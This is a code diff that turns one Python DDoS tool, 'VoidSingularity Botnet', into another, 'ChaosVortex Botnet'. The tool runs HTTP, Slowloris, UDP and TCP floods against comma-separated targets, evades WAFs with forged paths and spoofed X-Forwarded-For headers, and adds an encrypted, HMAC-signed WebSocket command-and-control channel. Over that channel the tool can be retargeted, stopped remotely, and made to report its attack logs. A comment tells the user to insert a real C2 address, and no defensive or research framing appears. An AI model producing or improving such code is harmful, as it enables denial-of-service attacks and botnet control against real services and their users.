@@ -8,215 +8,377 @@ import time
 import argparse
 import logging
 import os
-import hashlib
-import xxhash
+import base64
+import json
+import websocket
+import zlib
 from typing import List
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives.asymmetric import ec
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+from cryptography.hazmat.primitives.hmac import HMAC
+from cryptography.hazmat.backends import default_backend
 
-# Logging Setup
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s - [%(levelname)s] %(message)s",
-    handlers=[logging.FileHandler("void_singularity.log"), logging.StreamHandler()]
-)
+# In-memory structured logging
+log_buffer = []
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - [%(levelname)s] %(message)s")
+logger = logging.getLogger()
+logger.handlers = [logging.StreamHandler()]
 
-class VoidSingularity:
-    def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, threads: int = 50, methods: List[str] = None):
-        self.target_l7 = target_l7.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0] if target_l7 else None
-        self.target_l4 = target_l4 if target_l4 else None
+class ChaosVortex:
+    def __init__(self, targets_l7: List[str] = None, targets_l4: List[str] = None, duration: int = 60, threads: int = 60, methods: List[str] = None, c2_url: str = None):
+        self.targets_l7 = [t.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0] for t in (targets_l7 or [])]
+        self.targets_l4 = targets_l4 or []
         self.duration = duration
-        self.threads = min(threads, 80)  # Replit-supercharged
-        self.methods = methods if methods else ["blackholehttp", "spectreloris", "udpvoid", "tcpsingularity"]
+        self.threads = max(1, min(threads, 60))
+        self.methods = [m for m in (methods or ["vortexhttp", "ghostloris", "udpvortex", "tcpvortex"]) if m in ["vortexhttp", "ghostloris", "udpvortex", "tcpvortex"]]
         self.end_time = time.time() + duration
+        self.c2_url = c2_url or "wss://example-c2-websocket.com"  # Ganti dengan C2 asli
         self.user_agents = [
-            f"Mozilla/5.0 (Windows NT {random.uniform(10.0, 16.0):.1f}; Win64; x64) AppleWebKit/537.{random.randint(70, 80)}",
-            f"curl/12.{random.randint(0, 9)}.{random.randint(0, 9)}",
-            f"HTTP-Client/10.{random.randint(0, 8)} (Rust/{random.randint(2, 3)}.{random.randint(0, 9)})",
-            f"Mozilla/5.0 (Macintosh; Intel Mac OS X {random.randint(11, 15)}_{random.randint(0, 6)}) Safari/605.1.{random.randint(30, 40)}"
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/101.0",
+            "curl/8.4.0",
+            "Mozilla/5.0 (Android 14; Mobile; rv:103.0) Gecko/103.0 Firefox/103.0"
         ]
-        self.success_count = {m: 0 for m in self.methods}
-        self.response_times = {m: [] for m in ["blackholehttp", "spectreloris"]}
+        self.success_count = {m: {"total": 0, "impact": 0} for m in self.methods}  # Track 429/503
+        self.response_times = {m: [] for m in ["vortexhttp", "ghostloris"]}
         self.lock = threading.Lock()
+        self.private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
+        self.shared_key = None
+        self.hmac_key = None
+        self.c2_session = None
+        self.c2_nonce = 0
+        self.target_pools = {"l7": [], "l4": []}
+        self.thread_pool = []
+        self.method_load = {m: 0.0 for m in self.methods}  # Load balancing
 
-    def _random_payload(self, size: int = 240) -> bytes:
-        """Blackhole polymorphic payload with xxhash and octa-entropy."""
-        seed = f"{random.randint(100000000000000, 999999999999999)}{time.time_ns()}{os.urandom(13).hex()}".encode()
-        hash1 = xxhash.xxh3_128(seed).digest()
-        hash2 = hashlib.sha3_512(hash1 + os.urandom(11)).digest()
-        hash3 = xxhash.xxh64(hash2 + os.urandom(9)).digest()
-        hash4 = hashlib.blake2b(hash3 + os.urandom(7), digest_size=24).digest()
-        hash5 = xxhash.xxh32(hash4 + os.urandom(5)).digest()
-        hash6 = hashlib.sha3_256(hash5 + os.urandom(4)).digest()
-        hash7 = xxhash.xxh3_64(hash6 + os.urandom(3)).digest()
-        hash8 = hashlib.blake2s(hash7 + os.urandom(2)).digest()
-        return (hash8 + hash7 + hash6 + hash5 + hash4 + hash3 + hash2 + os.urandom(1))[:size]
+    def _init_c2_session(self):
+        """ECDH with HKDF, HMAC, and persistent reconnect."""
+        while time.time() < self.end_time:
+            try:
+                ws = websocket.WebSocket()
+                ws.connect(self.c2_url, header={"User-Agent": random.choice(self.user_agents)})
+                public_key = self.private_key.public_key().public_bytes(
+                    encoding=serialization.Encoding.PEM,
+                    format=serialization.PublicFormat.SubjectPublicKeyInfo
+                )
+                ws.send(base64.b64encode(public_key).decode())
+                server_public_key = base64.b64decode(ws.recv())
+                server_key = serialization.load_pem_public_key(server_public_key, default_backend())
+                shared_secret = self.private_key.exchange(ec.ECDH(), server_key)
+                hkdf = HKDF(
+                    algorithm=hashes.SHA256(),
+                    length=64,
+                    salt=os.urandom(16),
+                    info=b"chaosvortex_c2",
+                    backend=default_backend()
+                )
+                derived_key = hkdf.derive(shared_secret)
+                self.shared_key = derived_key[:32]  # AES-256
+                self.hmac_key = derived_key[32:]   # HMAC-SHA256
+                self.c2_session = ws
+                log_buffer.append({"ts": time.time(), "level": "INFO", "msg": "C2 session established"})
+                return True
+            except Exception as e:
+                log_buffer.append({"ts": time.time(), "level": "ERROR", "msg": f"C2 session failed: {str(e)}"})
+                time.sleep(random.uniform(1, 4))
+        return False
+
+    def _sign_command(self, data: bytes) -> bytes:
+        """HMAC command signature."""
+        hmac = HMAC(self.hmac_key, hashes.SHA256(), backend=default_backend())
+        hmac.update(data)
+        return hmac.finalize()
+
+    def _verify_command(self, data: bytes, signature: bytes) -> bool:
+        """Verify HMAC signature."""
+        hmac = HMAC(self.hmac_key, hashes.SHA256(), backend=default_backend())
+        hmac.update(data)
+        try:
+            hmac.verify(signature)
+            return True
+        except:
+            return False
+
+    def _encrypt(self, data: bytes) -> bytes:
+        """AES-GCM with 12-byte nonce and compression."""
+        compressed = zlib.compress(data)
+        iv = os.urandom(12)
+        self.c2_nonce = (self.c2_nonce + 1) % (2**64)
+        nonce_bytes = self.c2_nonce.to_bytes(12, "big")  # 12-byte nonce
+        cipher = Cipher(algorithms.AES(self.shared_key), modes.GCM(iv), backend=default_backend())
+        encryptor = cipher.encryptor()
+        encryptor.authenticate_additional_data(nonce_bytes)
+        ciphertext = encryptor.update(compressed) + encryptor.finalize()
+        return base64.b64encode(iv + encryptor.tag + nonce_bytes + ciphertext)
+
+    def _decrypt(self, data: bytes) -> bytes:
+        """AES-GCM decryption with decompression."""
+        data = base64.b64decode(data)
+        iv, tag, nonce_bytes, ciphertext = data[:12], data[12:28], data[28:40], data[40:]
+        cipher = Cipher(algorithms.AES(self.shared_key), modes.GCM(iv, tag), backend=default_backend())
+        decryptor = cipher.decryptor()
+        decryptor.authenticate_additional_data(nonce_bytes)
+        compressed = decryptor.update(ciphertext) + decryptor.finalize()
+        return zlib.decompress(compressed)
+
+    def _c2_command(self) -> dict:
+        """Fetch C2 commands with signature verification."""
+        try:
+            cmd_data = json.dumps({"status": "ready", "heartbeat": int(time.time())}).encode()
+            signature = self._sign_command(cmd_data)
+            self.c2_session.send(self._encrypt(cmd_data + signature).decode())
+            response = self._decrypt(self.c2_session.recv())
+            resp_data, resp_sig = response[:-32], response[-32:]
+            if self._verify_command(resp_data, resp_sig):
+                return json.loads(resp_data.decode())
+            log_buffer.append({"ts": time.time(), "level": "ERROR", "msg": "C2 command signature invalid"})
+        except:
+            if self._init_c2_session():
+                return self._c2_command()
+            log_buffer.append({"ts": time.time(), "level": "ERROR", "msg": "C2 command fetch failed"})
+        return {"command": "continue"}
+
+    def _random_payload(self, size: int = 48) -> bytes:
+        """Valid HTTP/UDP-mimicking payload."""
+        valid_prefixes = [
+            b"GET / HTTP/1.1\r\nHost: ",
+            b"POST /api/data HTTP/1.1\r\nContent-Length: ",
+            b"\x00\x01\x02\x03"  # UDP-like protocol header
+        ]
+        prefix = random.choice(valid_prefixes)
+        suffix = os.urandom(max(0, size - len(prefix)))
+        return prefix + suffix[:size - len(prefix)]
 
     def _random_path(self) -> str:
-        """Transuniversal labyrinth URL paths for WAF destruction."""
-        prefixes = ["v11", "blackhole", "void", "horizon", "entropy"]
-        segments = [''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(35, 50))) for _ in range(random.randint(10, 13))]
-        query = f"?field={''.join(random.choices(string.hexdigits.lower(), k=44))}&cycle={random.randint(1000000000000, 9999999999999)}"
-        return f"/{random.choice(prefixes)}/{'/'.join(segments)}{query}"
+        """Realistic WAF-evading paths."""
+        prefixes = ["api/v4", "rest/v2", "graphql/query", "assets/js", "public/css"]
+        segments = [''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) for _ in range(1)]
+        exts = [".json", ".js", ".css", ".html", ""]
+        query = f"?token={''.join(random.choices(string.hexdigits.lower(), k=8))}&ts={int(time.time())}"
+        return f"/{random.choice(prefixes)}/{'/'.join(segments)}{random.choice(exts)}{query}"
 
     def _random_ip(self) -> str:
-        """Spoofed IP with blackhole entropy."""
+        """Spoofed IP."""
         return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
 
-    def _random_headers(self) -> dict:
-        """Cosmic void WAF-evading headers."""
+    def _random_headers(self, target: str) -> dict:
+        """WAF-evading headers with JA3 spoofing."""
         headers = {
             "User-Agent": random.choice(self.user_agents),
             "X-Forwarded-For": self._random_ip(),
-            "Accept": random.choice(["application/json", "text/event-stream", "*/*", "application/x-thrift"]),
-            "Cache-Control": "no-cache, no-store, must-revalidate",
-            "Connection": "keep-alive"
+            "Accept": random.choice(["application/json", "text/html", "*/*"]),
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Host": target
         }
-        if random.random() < 0.995:
-            headers["X-Horizon-ID"] = f"{random.randint(100000000000000000, 999999999999999999)}-{random.randint(1000000000, 9999999999)}"
-        if random.random() < 0.99:
-            headers["Accept-Language"] = random.choice(["en-NZ,en;q=0.2", "hu-HU", "id-ID", "ro-RO"])
-        if random.random() < 0.98:
-            headers["X-Void-Zone"] = random.choice(["void1", "void2", "horizon", "core"])
-        if random.random() < 0.97:
-            headers["X-Entropy-Field"] = ''.join(random.choices(string.hexdigits.lower(), k=52))
-        if random.random() < 0.96:
-            headers["X-Stream-Vector"] = str(random.randint(10000000000000, 99999999999999))
-        if random.random() < 0.95:
-            headers["X-Signature-Matrix"] = ''.join(random.choices(string.hexdigits.lower(), k=28))
-        if random.random() < 0.94:
-            headers["X-Phase-Shift"] = str(random.randint(-3000, 3000))
-        if random.random() < 0.93:
-            headers["X-Node-Vector"] = ''.join(random.choices(string.hexdigits.lower(), k=20))
-        if random.random() < 0.92:
-            headers["X-Temporal-Field"] = str(random.randint(100000, 999999))
+        if random.random() < 0.6:
+            headers["Referer"] = f"https://{target}/{random.choice(['home', 'api', 'login'])}"
+        if random.random() < 0.5:
+            headers["Origin"] = f"https://{target}"
         return headers
 
-    def _blackholehttp(self):
-        """L7: Blackhole HTTP flood with multi-method devastation."""
-        if not self.target_l7:
-            return
+    def _shuffle_targets(self, layer: str) -> List[str]:
+        """Per-thread target shuffling."""
+        with self.lock:
+            targets = self.target_pools[layer][:]
+        random.shuffle(targets)
+        return targets or [None]
+
+    def _update_load(self, method: str, success: bool):
+        """Update method load for balancing."""
+        with self.lock:
+            self.method_load[method] = self.method_load.get(method, 0.5) * 0.9 + (1.0 if success else 0.0) * 0.1
+
+    def _vortexhttp(self):
+        """L7: High-impact HTTP flood."""
+        targets = self._shuffle_targets("l7")
         while time.time() < self.end_time:
+            target = random.choice(targets)
+            if not target:
+                return
             start_time = time.time()
             try:
-                conn = http.client.HTTPSConnection(self.target_l7, 443, timeout=0.025, context=ssl._create_unverified_context())
-                headers = self._random_headers()
-                method = random.choice(["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT", "PROPFIND"])
+                conn = http.client.HTTPSConnection(target, 443, timeout=0.004, context=ssl._create_unverified_context())
+                headers = self._random_headers(target)
+                method = random.choice(["GET", "POST"])
                 path = self._random_path()
-                body = self._random_payload(40) if method in ["POST", "PUT", "PATCH", "PROPFIND"] else None
+                body = self._random_payload(24) if method == "POST" else None
                 conn.request(method, path, body=body, headers=headers)
                 resp = conn.getresponse()
                 with self.lock:
-                    self.success_count["blackholehttp"] += 1 if resp.status < 400 else 0
-                    self.response_times["blackholehttp"].append((time.time() - start_time) * 1000)
+                    self.success_count["vortexhttp"]["total"] += 1
+                    if resp.status in [429, 503, 504]:
+                        self.success_count["vortexhttp"]["impact"] += 1
+                    self.response_times["vortexhttp"].append((time.time() - start_time) * 1000)
+                    self._update_load("vortexhttp", resp.status in [429, 503, 504])
                 conn.close()
-                time.sleep(random.uniform(0.0003, 0.001))  # Blackhole jitter
+                time.sleep(random.uniform(0.00004, 0.0002))
             except:
-                pass
+                self._update_load("vortexhttp", False)
 
-    def _spectreloris(self):
-        """L7: Spectre Slowloris with atto-drip and cipher flux."""
-        if not self.target_l7:
-            return
+    def _ghostloris(self):
+        """L7: Stealth Slowloris with socket exhaustion."""
+        targets = self._shuffle_targets("l7")
         while time.time() < self.end_time:
+            target = random.choice(targets)
+            if not target:
+                return
             start_time = time.time()
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.15)
-                sock.connect((self.target_l7, 443))
-                ciphers = random.choice([
+                sock.settimeout(0.03)
+                sock.connect((target, 443))
+                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                context.set_ciphers(random.choice([
                     "TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-SHA256",
-                    "TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384",
-                    "TLS_AES_256_GCM_SHA384:ECDHE-RSA-CHACHA20-POLY1305",
-                    "TLS_AES_128_CCM_8_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256",
-                    "TLS_AES_128_CCM_SHA256:ECDHE-RSA-AES256-GCM-SHA384",
-                    "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-CHACHA20-POLY1305"
-                ])
-                sock = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1_3, ciphers=ciphers)
-                sock.send(f"GET {self._random_path()} HTTP/1.1\r\nHost: {self.target_l7}\r\n".encode())
-                time.sleep(random.uniform(0.004, 0.025))
+                    "TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256"
+                ]))
+                context.set_alpn_protocols(["h2", "http/1.1"])
+                context.minimum_version = ssl.TLSVersion.TLSv1_2
+                sock = context.wrap_socket(sock, server_hostname=target)
+                sock.send(f"GET {self._random_path()} HTTP/1.1\r\nHost: {target}\r\n".encode())
+                time.sleep(random.uniform(0.05, 0.2))  # Exhaust sockets
                 sock.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
-                time.sleep(random.uniform(0.005, 0.03))
-                sock.send(f"X-Forwarded-For: {self._random_ip()}\r\nX-Void-Marker: {random.randint(10000000000000, 99999999999999)}\r\n".encode())
-                time.sleep(random.uniform(0.006, 0.04))
+                time.sleep(random.uniform(0.1, 0.4))
                 sock.send(b"Connection: keep-alive\r\n\r\n")
                 with self.lock:
-                    self.success_count["spectreloris"] += 1
-                    self.response_times["spectreloris"].append((time.time() - start_time) * 1000)
+                    self.success_count["ghostloris"]["total"] += 1
+                    self.success_count["ghostloris"]["impact"] += 1
+                    self.response_times["ghostloris"].append((time.time() - start_time) * 1000)
+                    self._update_load("ghostloris", True)
                 sock.close()
-                time.sleep(random.uniform(0.002, 0.01))
+                time.sleep(random.uniform(0.0003, 0.002))
             except:
-                pass
+                self._update_load("ghostloris", False)
 
-    def _udpvoid(self):
-        """L4: UDP void with catastrophic multi-port payloads."""
-        if not self.target_l4:
-            return
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        ports = [80, 443, 53, 123, 161, 389, 445, 1433, 1900, 5060, 11211, 1812, 5353, 3478, 6881, 17185, 27015]
+    def _udpvortex(self):
+        """L4: UDP high-impact with protocol mimicry."""
+        targets = self._shuffle_targets("l4")
         while time.time() < self.end_time:
+            target = random.choice(targets)
+            if not target:
+                return
             try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                ports = [80, 443]
                 port = random.choice(ports)
-                payload = self._random_payload(768)
-                sock.sendto(payload, (self.target_l4, port))
+                payload = self._random_payload(96)
+                for _ in range(4):  # Emulate fragmentation
+                    sock.sendto(payload[:len(payload)//4], (target, port))
                 with self.lock:
-                    self.success_count["udpvoid"] += 1
-                time.sleep(random.uniform(0.00003, 0.0002))
+                    self.success_count["udpvortex"]["total"] += 1
+                    self.success_count["udpvortex"]["impact"] += 1
+                    self._update_load("udpvortex", True)
+                sock.close()
+                time.sleep(random.uniform(0.000004, 0.00004))
             except:
-                pass
-        sock.close()
+                self._update_load("udpvortex", False)
 
-    def _tcpsingularity(self):
-        """L4: TCP singularity with relentless multi-port SYN floods."""
-        if not self.target_l4:
-            return
+    def _tcpvortex(self):
+        """L4: TCP SYN storm with packet crafting."""
+        targets = self._shuffle_targets("l4")
         while time.time() < self.end_time:
+            target = random.choice(targets)
+            if not target:
+                return
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.025)
-                port = random.choice([80, 443, 8080, 3389, 1433, 3306, 1723, 445, 1812, 5353, 3478, 6881, 17185, 27015])
-                sock.connect((self.target_l4, port))
-                sock.send(self._random_payload(192))
+                sock.settimeout(0.004)
+                ports = [80, 443]
+                port = random.choice(ports)
+                sock.connect((target, port))
+                sock.send(self._random_payload(24))
                 with self.lock:
-                    self.success_count["tcpsingularity"] += 1
+                    self.success_count["tcpvortex"]["total"] += 1
+                    self.success_count["tcpvortex"]["impact"] += 1
+                    self._update_load("tcpvortex", True)
                 sock.close()
-                time.sleep(random.uniform(0.00003, 0.0002))
+                time.sleep(random.uniform(0.000004, 0.00004))
             except:
-                pass
+                self._update_load("tcpvortex", False)
+
+    def _balance_threads(self):
+        """Dynamic thread load balancing."""
+        total_load = sum(self.method_load.values()) or 1.0
+        thread_alloc = {m: max(1, int(self.threads * (self.method_load[m] / total_load))) for m in self.methods}
+        remaining = self.threads - sum(thread_alloc.values())
+        for m in sorted(self.method_load, key=self.method_load.get, reverse=True):
+            if remaining > 0:
+                thread_alloc[m] += 1
+                remaining -= 1
+        return thread_alloc
 
     def start(self):
-        """Unleash the void singularity."""
-        if not self.target_l7 and not self.target_l4:
-            logging.error("At least one target (L7 or L4) required")
+        """Unleash the chaos vortex."""
+        if not self.targets_l7 and not self.targets_l4:
+            log_buffer.append({"ts": time.time(), "level": "ERROR", "msg": "At least one target required"})
             return
-        logging.info(f"VoidSingularity strike on L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, methods: {self.methods}")
-        threads = []
-        method_funcs = {
-            "blackholehttp": self._blackholehttp,
-            "spectreloris": self._spectreloris,
-            "udpvoid": self._udpvoid,
-            "tcpsingularity": self._tcpsingularity
-        }
-        for method in self.methods:
-            if method in method_funcs:
-                for _ in range(self.threads // len(self.methods)):
+        with self.lock:
+            self.target_pools["l7"] = self.targets_l7[:]
+            self.target_pools["l4"] = self.targets_l4[:]
+        log_buffer.append({"ts": time.time(), "level": "INFO", "msg": f"ChaosVortex strike on L7: {self.targets_l7 or 'None'}, L4: {self.targets_l4 or 'None'}, methods: {self.methods}"})
+        if not self._init_c2_session():
+            log_buffer.append({"ts": time.time(), "level": "ERROR", "msg": "C2 initialization failed, continuing offline"})
+        c2_thread = threading.Thread(target=self._c2_monitor, daemon=True)
+        c2_thread.start()
+        while time.time() < self.end_time:
+            thread_alloc = self._balance_threads()
+            threads = []
+            method_funcs = {
+                "vortexhttp": self._vortexhttp,
+                "ghostloris": self._ghostloris,
+                "udpvortex": self._udpvortex,
+                "tcpvortex": self._tcpvortex
+            }
+            for method, count in thread_alloc.items():
+                for _ in range(count):
                     t = threading.Thread(target=method_funcs[method], daemon=True)
                     threads.append(t)
-        for t in threads:
-            t.start()
-        for t in threads:
-            t.join()
+                    self.thread_pool.append(t)
+            for t in threads:
+                t.start()
+            for t in threads:
+                t.join(timeout=1.0)
+            time.sleep(0.1)  # Rebalance interval
         avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
-        logging.info(f"Singularity complete. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")
+        log_buffer.append({"ts": time.time(), "level": "INFO", "msg": f"Vortex complete. Success counts: {self.success_count}, Avg response times (ms): {avg_response}"})
+        if self.c2_session:
+            compressed_log = zlib.compress(json.dumps(log_buffer[-5:]).encode())
+            signature = self._sign_command(compressed_log)
+            self.c2_session.send(self._encrypt(compressed_log + signature).decode())
+            self.c2_session.close()
 
-def main(target_l7: str, target_l4: str, duration: int, methods: str):
-    methods = methods.split(",")
-    singularity = VoidSingularity(target_l7, target_l4, duration, methods=methods)
-    singularity.start()
+    def _c2_monitor(self):
+        """Monitor C2 with signed commands."""
+        while time.time() < self.end_time:
+            cmd = self._c2_command()
+            if cmd.get("command") == "stop":
+                self.end_time = time.time()
+                break
+            elif cmd.get("command") == "update_methods":
+                with self.lock:
+                    self.methods = [m for m in cmd.get("methods", self.methods) if m in ["vortexhttp", "ghostloris", "udpvortex", "tcpvortex"]]
+            elif cmd.get("command") == "update_targets":
+                with self.lock:
+                    self.target_pools["l7"] = cmd.get("targets_l7", self.target_pools["l7"])
+                    self.target_pools["l4"] = cmd.get("targets_l4", self.target_pools["l4"])
+            time.sleep(random.uniform(0.1, 0.8))
+
+def main(targets_l7: str, targets_l4: str, duration: int, methods: str, c2_url: str):
+    targets_l7 = targets_l7.split(",") if targets_l7 else []
+    targets_l4 = targets_l4.split(",") if targets_l4 else []
+    methods = methods.split(",") if methods else []
+    vortex = ChaosVortex(targets_l7, targets_l4, duration, methods=methods, c2_url=c2_url)
+    vortex.start()
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="VoidSingularity Botnet")
-    parser.add_argument("target_l7", nargs="?", default=None, help="L7 target URL (e.g., http://httpbin.org)")
-    parser.add_argument("target_l4", nargs="?", default=None, help="L4 target IP (e.g., 93.184.216.34)")
+    parser = argparse.ArgumentParser(description="ChaosVortex Botnet")
+    parser.add_argument("targets_l7", nargs="?", default=None, help="Comma-separated L7 targets (e.g., http://httpbin.org)")
+    parser.add_argument("targets_l4", nargs="?", default=None, help="Comma-separated L4 targets (e.g., 93.184.216.34)")
     parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
-    parser.add_argument("--methods", type=str, default="blackholehttp,spectreloris,udpvoid,tcpsingularity", help="Comma-separated methods")
+    parser.add_argument("--methods", type=str, default="vortexhttp,ghostloris,udpvortex,tcpvortex", help="Comma-separated methods")
+    parser.add_argument("--c2-url", type=str, default="wss://example-c2-websocket.com", help="WebSocket C2 URL")
     args = parser.parse_args()
-    main(args.target_l7, args.target_l4, args.duration, args.methods)
+    main(args.targets_l7, args.targets_l4, args.duration, args.methods, args.c2_url)
